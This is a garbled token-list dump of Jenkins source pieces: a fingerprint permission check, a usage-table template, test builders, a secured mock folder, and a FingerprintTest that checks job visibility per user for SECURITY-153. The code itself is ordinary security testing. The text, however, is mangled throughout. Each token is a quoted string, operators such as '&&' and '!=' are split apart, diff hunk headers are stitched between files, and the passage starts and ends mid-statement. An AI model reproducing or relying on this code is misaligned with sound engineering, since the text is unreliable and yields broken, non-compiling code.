"if", "(", "canDiscoverTheItem", ")", "{", "ItemGroup", "<", "?>", "current", "=", "itemBySystemUser", ".", "getParent", "(", ");", "do", "{", "if", "(", "current", "instanceof", "Item", ")", "{", "final", "Item", "item", "=", "(", "Item", ")", "current", ";", "current", "=", "item", ".", "getParent", "(", ");", "if", "(", "!", "item", ".", "getACL", "(", ").", "hasPermission", "(", "userAuth", ",", "Item", ".", "READ", ")", ")", "{", "canDiscoverTheItem", "=", "false", ";", "}", "}", "else", "{", "current", "=", "null", ";", "}", "}", "while", "(", "canDiscoverTheItem", "&", "&", "current", "!", "=", "null", ")", ";", "}", "res", "[", "0", "]", "=", "canDiscoverTheItem", ";", "}", "}", ");", "return", "res", "[", "0", "]", ";", "}", "<", "j", ":", "set", "var", "=", "\"", "usages", "\"", "value", "=", "\"$", "{", "it", ".", "usages", "}", "\"/", ">", "<", "j", ":", "set", "var", "=", "\"", "range", "\"", "value", "=", "\"$", "{", "usages", "[", "j", "]", "}\"", "/", ">", "<", "j", ":", "if", "test", "=", "\"$", "{", "job", "!", "=", "null", "}", "\">", "<", "!-", "-", "Otherwise", "we", "don", "'", "t", "display", "links", "at", "all", "-", "->", "<", "tr", ">", "<", "td", "class", "=", "\"", "fingerprint", "-", "summary", "-", "header", "\"", ">", "<", "a", "href", "=", "\"$", "{", "rootURL", "}", "/$", "{", "job", ".", "url", "}", "\"", "class", "=", "\"", "model", "-", "link", "inside", "\"", ">$", "{", "j", "}", "</", "a", ">", "<", "td", ">", "<", "t", ":", "buildRangeLink", "job", "=", "\"$", "{", "job", "}", "\"", "range", "=", "\"$", "{", "range", "}", "\"", "/", ">", "<", "/", "td", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "/", "j", ":", "if", ">", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2015", "Oleg", "Nenashev", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "org", ".", "jvnet", ".", "hudson", ".", "test", ";", "import", "hudson", ".", "AbortException", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "FilePath", ";", "import", "hudson", ".", "Launcher", ";", "import", "hudson", ".", "model", ".", "AbstractBuild", ";", "import", "hudson", ".", "model", ".", "BuildListener", ";", "import", "hudson", ".", "model", ".", "Descriptor", ";", "import", "hudson", ".", "tasks", ".", "Builder", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "javax", ".", "annotation", ".", "Nonnull", ";", "import", "net", ".", "sf", ".", "json", ".", "JSONObject", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "/", "**", "*", "Creates", "a", "test", "builder", ",", "which", "creates", "a", "file", "in", "the", "workspace", ".", "*", "@", "author", "Oleg", "Nenashev", "*", "@", "since", "TODO", "*", "/", "public", "class", "CreateFileBuilder", "extends", "Builder", "{", "@", "Nonnull", "private", "final", "String", "fileName", ";", "@", "Nonnull", "private", "final", "String", "fileContent", ";", "public", "CreateFileBuilder", "(", "@", "Nonnull", "String", "fileName", ",", "@", "Nonnull", "String", "fileContent", ")", "{", "this", ".", "fileName", "=", "fileName", ";", "this", ".", "fileContent", "=", "fileContent", ";", "}", "@", "Nonnull", "public", "String", "getFileName", "(", ")", "{", "return", "fileName", ";", "}", "@", "Nonnull", "public", "String", "getFileContent", "(", ")", "{", "return", "fileContent", ";", "}", "@", "Override", "public", "boolean", "perform", "(", "AbstractBuild", "<", "?,", "?", ">", "build", ",", "Launcher", "launcher", ",", "BuildListener", "listener", ")", "throws", "InterruptedException", ",", "IOException", "{", "listener", ".", "getLogger", "(", ").", "println", "(", "\"", "Creating", "a", "file", "\"", "+", "fileName", ")", ";", "FilePath", "workspace", "=", "build", ".", "getWorkspace", "(", ");", "if", "(", "workspace", "=", "=", "null", ")", "{", "throw", "new", "AbortException", "(", "\"", "Cannot", "get", "the", "workspace", "of", "the", "build", "\"", ");", "}", "workspace", ".", "child", "(", "fileName", ")", ".", "write", "(", "fileContent", ",", "\"", "UTF", "-", "8", "\"", ");", "return", "true", ";", "}", "@", "Override", "public", "Descriptor", "<", "Builder", ">", "getDescriptor", "(", ")", "{", "return", "new", "DescriptorImpl", "(", ");", "}", "@", "Extension", "public", "static", "final", "class", "DescriptorImpl", "extends", "Descriptor", "<", "Builder", ">", "{", "@", "Override", "public", "Builder", "newInstance", "(", "StaplerRequest", "req", ",", "JSONObject", "data", ")", "{", "throw", "new", "UnsupportedOperationException", "(", "\"", "This", "is", "a", "temporarytest", "class", ",", "\"", "+", "\"", "which", "should", "not", "be", "configured", "from", "UI", "\"", ");", "}", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "\"", "Create", "a", "file", "\"", ";", "}", "}", "}", "@", "@", "-", "77", ",", "7", "+", "77", ",", "7", "@", "@", "protected", "MockFolder", "(", "ItemGroup", "parent", ",", "String", "name", ")", "{", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2015", "Oleg", "Nenashev", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "org", ".", "jvnet", ".", "hudson", ".", "test", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "model", ".", "Item", ";", "import", "hudson", ".", "model", ".", "ItemGroup", ";", "import", "hudson", ".", "model", ".", "TopLevelItem", ";", "import", "hudson", ".", "model", ".", "TopLevelItemDescriptor", ";", "import", "hudson", ".", "security", ".", "ACL", ";", "import", "hudson", ".", "security", ".", "Permission", ";", "import", "hudson", ".", "security", ".", "SidACL", ";", "import", "hudson", ".", "security", ".", "SparseACL", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "javax", ".", "annotation", ".", "Nonnull", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "acegisecurity", ".", "Authentication", ";", "import", "org", ".", "acegisecurity", ".", "acls", ".", "sid", ".", "Sid", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "Restricted", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "restrictions", ".", "NoExternalUse", ";", "/", "**", "*", "Folder", "stub", "with", "a", "configurable", "permission", "control", ".", "*", "The", "implementation", "secures", "the", "access", "to", "the", "item", "and", "to", "its", "children", ".", "*", "@", "author", "Oleg", "Nenashev", "*", "@", "since", "TODO", "*", "/", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "/", "/", "Unrestrict", "after", "integrating", "into", "Jenkins", "trunk", "public", "class", "SecuredMockFolder", "extends", "MockFolder", "{", "private", "String", "grantedUser", ";", "private", "Set", "<", "String", ">", "grantedPermissions", ";", "private", "SecuredMockFolder", "(", "ItemGroup", "parent", ",", "String", "name", ")", "{", "super", "(", "parent", ",", "name", ")", ";", "}", "@", "Override", "public", "TopLevelItem", "getItem", "(", "String", "name", ")", "{", "final", "TopLevelItem", "item", "=", "super", ".", "getItem", "(", "name", ")", ";", "if", "(", "item", "!", "=", "null", "&", "&", "item", ".", "hasPermission", "(", "Item", ".", "READ", ")", ")", "{", "return", "item", ";", "}", "return", "null", ";", "}", "@", "Override", "public", "boolean", "hasPermission", "(", "Permission", "p", ")", "{", "if", "(", "super", ".", "hasPermission", "(", "p", ")", ")", "{", "return", "true", ";", "}", "return", "hasPermissionInField", "(", "Jenkins", ".", "getAuthentication", "(", ").", "getName", "(", "),", "p", ")", ";", "}", "private", "boolean", "hasPermissionInField", "(", "String", "sid", ",", "@", "Nonnull", "Permission", "p", ")", "{", "if", "(", "sid", ".", "equals", "(", "grantedUser", ")", ")", "{", "if", "(", "grantedPermissions", "!", "=", "null", "&", "&", "grantedPermissions", ".", "contains", "(", "p", ".", "getId", "(", "))", ")", "{", "return", "true", ";", "}", "}", "return", "false", ";", "}", "@", "Override", "public", "ACL", "getACL", "(", ")", "{", "return", "new", "ACLWrapper", "(", ");", "}", "public", "void", "setPermissions", "(", "String", "username", ",", "Permission", ".", "..", "permissions", ")", "{", "this", ".", "grantedUser", "=", "username", ";", "if", "(", "grantedPermissions", "=", "=", "null", ")", "{", "grantedPermissions", "=", "new", "HashSet", "<", "String", ">", "()", ";", "}", "else", "{", "grantedPermissions", ".", "clear", "(", ");", "}", "for", "(", "Permission", "p", ":", "permissions", ")", "{", "grantedPermissions", ".", "add", "(", "p", ".", "getId", "(", "))", ";", "}", "}", "@", "Extension", "public", "static", "class", "DescriptorImpl", "extends", "TopLevelItemDescriptor", "{", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "\"", "MockFolder", "with", "security", "control", "\"", ";", "}", "@", "Override", "public", "TopLevelItem", "newInstance", "(", "ItemGroup", "parent", ",", "String", "name", ")", "{", "return", "new", "SecuredMockFolder", "(", "parent", ",", "name", ")", ";", "}", "}", "private", "class", "ACLWrapper", "extends", "SidACL", "{", "@", "Override", "protected", "Boolean", "hasPermission", "(", "Sid", "p", ",", "Permission", "permission", ")", "{", "/", "/", "TODO", ":", "Handle", "globally", "defined", "permissions", "?", "return", "SecuredMockFolder", ".", "this", ".", "hasPermissionInField", "(", "toString", "(", "p", ")", ",", "permission", ")", ";", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "116", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2015", "Oleg", "Nenashev", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "org", ".", "jvnet", ".", "hudson", ".", "test", ";", "import", "hudson", ".", "AbortException", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "FilePath", ";", "import", "hudson", ".", "Launcher", ";", "import", "hudson", ".", "model", ".", "AbstractBuild", ";", "import", "hudson", ".", "model", ".", "AbstractProject", ";", "import", "hudson", ".", "model", ".", "BuildListener", ";", "import", "hudson", ".", "model", ".", "Descriptor", ";", "import", "hudson", ".", "tasks", ".", "Builder", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "net", ".", "sf", ".", "json", ".", "JSONObject", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "/", "**", "*", "Test", "Builder", ",", "which", "copies", "a", "file", "from", "a", "workspace", "of", "another", "job", ".", "*", "Supports", "{", "@", "link", "AbstractProject", "}", "s", "only", ".", "*", "@", "author", "Oleg", "Nenashev", "*", "/", "public", "class", "WorkspaceCopyFileBuilder", "extends", "Builder", "{", "private", "final", "String", "fileName", ";", "private", "final", "String", "jobName", ";", "private", "final", "int", "buildNumber", ";", "public", "WorkspaceCopyFileBuilder", "(", "String", "fileName", ",", "String", "jobName", ",", "int", "buildNumber", ")", "{", "this", ".", "fileName", "=", "fileName", ";", "this", ".", "jobName", "=", "jobName", ";", "this", ".", "buildNumber", "=", "buildNumber", ";", "}", "public", "int", "getBuildNumber", "(", ")", "{", "return", "buildNumber", ";", "}", "public", "String", "getFileName", "(", ")", "{", "return", "fileName", ";", "}", "public", "String", "getJobName", "(", ")", "{", "return", "jobName", ";", "}", "@", "Override", "public", "boolean", "perform", "(", "AbstractBuild", "<", "?,", "?", ">", "build", ",", "Launcher", "launcher", ",", "BuildListener", "listener", ")", "throws", "InterruptedException", ",", "IOException", "{", "listener", ".", "getLogger", "(", ").", "println", "(", "\"", "Copying", "a", "\"", "+", "fileName", "+", "\"", "from", "\"", "+", "jobName", "+", "\"", "#\"", "+", "buildNumber", ")", ";", "Jenkins", "inst", "=", "Jenkins", ".", "getInstance", "(", ");", "AbstractProject", "<", "?,", "?>", "item", "=", "inst", ".", "getItemByFullName", "(", "jobName", ",", "AbstractProject", ".", "class", ")", ";", "if", "(", "item", "=", "=", "null", ")", "{", "throw", "new", "AbortException", "(", "\"", "Cannot", "find", "a", "source", "job", ":", "\"", "+", "jobName", ")", ";", "}", "AbstractBuild", "<", "?,", "?>", "sourceBuild", "=", "item", ".", "getBuildByNumber", "(", "buildNumber", ")", ";", "if", "(", "sourceBuild", "=", "=", "null", ")", "{", "throw", "new", "AbortException", "(", "\"", "Cannot", "find", "a", "source", "build", ":", "\"", "+", "jobName", "+", "\"", "#\"", "+", "buildNumber", ")", ";", "}", "FilePath", "sourceWorkspace", "=", "sourceBuild", ".", "getWorkspace", "(", ");", "if", "(", "sourceWorkspace", "=", "=", "null", ")", "{", "throw", "new", "AbortException", "(", "\"", "Cannot", "get", "the", "source", "workspace", "from", "\"", "+", "sourceBuild", ".", "getDisplayName", "(", "))", ";", "}", "FilePath", "workspace", "=", "build", ".", "getWorkspace", "(", ");", "if", "(", "workspace", "=", "=", "null", ")", "{", "throw", "new", "IOException", "(", "\"", "Cannot", "get", "the", "workspace", "of", "the", "build", "\"", ");", "}", "workspace", ".", "child", "(", "fileName", ")", ".", "copyFrom", "(", "sourceWorkspace", ".", "child", "(", "fileName", ")", ");", "return", "true", ";", "}", "@", "Override", "public", "Descriptor", "<", "Builder", ">", "getDescriptor", "(", ")", "{", "return", "new", "DescriptorImpl", "(", ");", "}", "@", "Extension", "public", "static", "final", "class", "DescriptorImpl", "extends", "Descriptor", "<", "Builder", ">", "{", "@", "Override", "public", "Builder", "newInstance", "(", "StaplerRequest", "req", ",", "JSONObject", "data", ")", "{", "throw", "new", "UnsupportedOperationException", "(", ");", "}", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "\"", "Copy", "a", "file", "from", "the", "workspace", "of", "another", "build", "\"", ";", "}", "}", "}", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2015", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "model", ";", "import", "hudson", ".", "security", ".", "ACL", ";", "import", "hudson", ".", "security", ".", "AuthorizationMatrixProperty", ";", "import", "hudson", ".", "security", ".", "Permission", ";", "import", "hudson", ".", "security", ".", "ProjectMatrixAuthorizationStrategy", ";", "import", "hudson", ".", "tasks", ".", "ArtifactArchiver", ";", "import", "hudson", ".", "tasks", ".", "Fingerprinter", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Hashtable", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "javax", ".", "annotation", ".", "CheckForNull", ";", "import", "javax", ".", "annotation", ".", "Nonnull", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "CreateFileBuilder", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "JenkinsRule", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Issue", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "MockFolder", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "SecuredMockFolder", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "WorkspaceCopyFileBuilder", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "*;", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "notNullValue", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "nullValue", ";", "/", "/", "TODO", ":", "Refactoring", ":", "Tests", "should", "be", "exchanged", "with", "FingerprinterTest", "somehow", "/", "**", "*", "Tests", "for", "the", "{", "@", "link", "Fingerprint", "}", "class", ".", "*", "@", "author", "Oleg", "Nenashev", "*", "/", "public", "class", "FingerprintTest", "{", "@", "Rule", "public", "JenkinsRule", "rule", "=", "new", "JenkinsRule", "(", ");", "@", "Before", "public", "void", "setupRealm", "(", ")", "{", "rule", ".", "jenkins", ".", "setSecurityRealm", "(", "rule", ".", "createDummySecurityRealm", "(", "))", ";", "}", "@", "Test", "public", "void", "shouldCreateFingerprintsForWorkspace", "(", ")", "throws", "Exception", "{", "FreeStyleProject", "project", "=", "rule", ".", "createFreeStyleProject", "(", ");", "project", ".", "getBuildersList", "(", ").", "add", "(", "new", "CreateFileBuilder", "(", "\"", "test", ".", "txt", "\"", ",", "\"", "Hello", ",", "world", "!", "\")", ");", "project", ".", "getPublishersList", "(", ").", "add", "(", "new", "Fingerprinter", "(", "\"", "test", ".", "txt", "\"", ",", "false", ")", ");", "FreeStyleBuild", "build", "=", "rule", ".", "buildAndAssertSuccess", "(", "project", ")", ";", "Fingerprint", "fp", "=", "getFingerprint", "(", "build", ",", "\"", "test", ".", "txt", "\"", ");", "}", "@", "Test", "public", "void", "shouldCreateFingerprintsForArtifacts", "(", ")", "throws", "Exception", "{", "FreeStyleProject", "project", "=", "rule", ".", "createFreeStyleProject", "(", ");", "project", ".", "getBuildersList", "(", ").", "add", "(", "new", "CreateFileBuilder", "(", "\"", "test", ".", "txt", "\"", ",", "\"", "Hello", ",", "world", "!", "\")", ");", "ArtifactArchiver", "archiver", "=", "new", "ArtifactArchiver", "(", "\"", "test", ".", "txt", "\"", ");", "archiver", ".", "setFingerprint", "(", "true", ")", ";", "project", ".", "getPublishersList", "(", ").", "add", "(", "archiver", ")", ";", "FreeStyleBuild", "build", "=", "rule", ".", "buildAndAssertSuccess", "(", "project", ")", ";", "Fingerprint", "fp", "=", "getFingerprint", "(", "build", ",", "\"", "test", ".", "txt", "\"", ");", "}", "@", "Test", "public", "void", "shouldCreateUsageLinks", "(", ")", "throws", "Exception", "{", "/", "/", "Project", "1", "FreeStyleProject", "project", "=", "createAndRunProjectWithPublisher", "(", "\"", "fpProducer", "\"", ",", "\"", "test", ".", "txt", "\"", ");", "final", "FreeStyleBuild", "build", "=", "project", ".", "getLastBuild", "(", ");", "/", "/", "Project", "2", "FreeStyleProject", "project2", "=", "rule", ".", "createFreeStyleProject", "(", ");", "project2", ".", "getBuildersList", "(", ").", "add", "(", "new", "WorkspaceCopyFileBuilder", "(", "\"", "test", ".", "txt", "\"", ",", "project", ".", "getName", "(", "),", "build", ".", "getNumber", "(", "))", ");", "project2", ".", "getPublishersList", "(", ").", "add", "(", "new", "Fingerprinter", "(", "\"", "test", ".", "txt", "\"", "))", ";", "FreeStyleBuild", "build2", "=", "rule", ".", "buildAndAssertSuccess", "(", "project2", ")", ";", "Fingerprint", "fp", "=", "getFingerprint", "(", "build", ",", "\"", "test", ".", "txt", "\"", ");", "/", "/", "Check", "references", "Fingerprint", ".", "BuildPtr", "original", "=", "fp", ".", "getOriginal", "(", ");", "assertEquals", "(", "\"", "Original", "reference", "contains", "a", "wrong", "job", "name", "\"", ",", "project", ".", "getName", "(", "),", "original", ".", "getName", "(", "))", ";", "assertEquals", "(", "\"", "Original", "reference", "contains", "a", "wrong", "build", "number", "\"", ",", "build", ".", "getNumber", "(", "),", "original", ".", "getNumber", "(", "))", ";", "Hashtable", "<", "String", ",", "Fingerprint", ".", "RangeSet", ">", "usages", "=", "fp", ".", "getUsages", "(", ");", "assertTrue", "(", "\"", "Usages", "do", "not", "have", "a", "reference", "to", "\"", "+", "project", ",", "usages", ".", "containsKey", "(", "project", ".", "getName", "(", "))", ");", "assertTrue", "(", "\"", "Usages", "do", "not", "have", "a", "reference", "to", "\"", "+", "project2", ",", "usages", ".", "containsKey", "(", "project2", ".", "getName", "(", "))", ");", "}", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "153", "\"", ")", "public", "void", "shouldBeUnableToSeeJobsIfNoPermissions", "(", ")", "throws", "Exception", "{", "/", "/", "Project", "1", "final", "FreeStyleProject", "project1", "=", "createAndRunProjectWithPublisher", "(", "\"", "fpProducer", "\"", ",", "\"", "test", ".", "txt", "\"", ");", "final", "FreeStyleBuild", "build", "=", "project1", ".", "getLastBuild", "(", ");", "/", "/", "Project", "2", "final", "FreeStyleProject", "project2", "=", "rule", ".", "createFreeStyleProject", "(", "\"", "project2", "\"", ");", "project2", ".", "getBuildersList", "(", ").", "add", "(", "new", "WorkspaceCopyFileBuilder", "(", "\"", "test", ".", "txt", "\"", ",", "project1", ".", "getName", "(", "),", "build", ".", "getNumber", "(", "))", ");", "project2", ".", "getPublishersList", "(", ").", "add", "(", "new", "Fingerprinter", "(", "\"", "test", ".", "txt", "\"", "))", ";", "final", "FreeStyleBuild", "build2", "=", "rule", ".", "buildAndAssertSuccess", "(", "project2", ")", ";", "/", "/", "Get", "fingerprint", "final", "Fingerprint", "fp", "=", "getFingerprint", "(", "build", ",", "\"", "test", ".", "txt", "\"", ");", "/", "/", "Init", "Users", "User", "user1", "=", "User", ".", "get", "(", "\"", "user1", "\"", ");", "/", "/", "can", "access", "project1", "User", "user2", "=", "User", ".", "get", "(", "\"", "user2", "\"", ");", "/", "/", "can", "access", "project2", "User", "user3", "=", "User", ".", "get", "(", "\"", "user3", "\"", ");", "/", "/", "cannot", "access", "anything", "/", "/", "Project", "permissions", "setupProjectMatrixAuthStrategy", "(", "Jenkins", ".", "READ", ")", ";", "setJobPermissionsOnce", "(", "project1", ",", "\"", "user1", "\"", ",", "Item", ".", "READ", ",", "Item", ".", "DISCOVER", ")", ";", "setJobPermissionsOnce", "(", "project2", ",", "\"", "user2", "\"", ",", "Item", ".", "READ", ",", "Item", ".", "DISCOVER", ")", ";", "ACL", ".", "impersonate", "(", "user1", ".", "impersonate", "(", "),", "new", "Runnable", "(", ")", "{", "@", "Override", "public", "void", "run", "(", ")", "{", "Fingerprint", ".", "BuildPtr", "original", "=", "fp", ".", "getOriginal", "(", ");", "assertThat", "(", "\"", "user1", "should", "be", "able", "to", "see", "the", "origin", "\"", ",", "fp", ".", "getOriginal", "(", "),", "notNullValue", "(", "))", ";", "assertEquals", "(", "\"", "user1", "should", "be", "able", "to", "see", "the", "origin", "'", "s", "project", "name", "\"", ",", "project1", ".", "getName", "(", "),", "original", ".", "getName", "(", "))", ";", "assertEquals", "(", "\"", "user1", "should", "be", "able", "to", "see", "the", "origin", "'", "s", "build", "number", "\"", ",", "build", ".", "getNumber", "(", "),", "original", ".", "getNumber", "(", "))", ";", "assertEquals", "(", "\"", "Only", "one", "usage", "should", "be", "visible", "to", "user1", "\"", ",", "1", ",", "fp", ".", "_getUsages", "(", ").", "size", "(", "))", ";", "assertEquals", "(", "\"", "Only", "project1", "should", "be", "visible", "to", "user1", "\"", ",", "project1", ".", "getFullName", "(", "),", "fp", ".", "_getUsages", "(", ").", "get", "(", "0", ")", ".", "name", ")", ";", "}", "}", ");", "ACL", ".", "impersonate", "(", "user2", ".", "impersonate", "(", "),", "new", "Runnable", "(", ")", "{", "@", 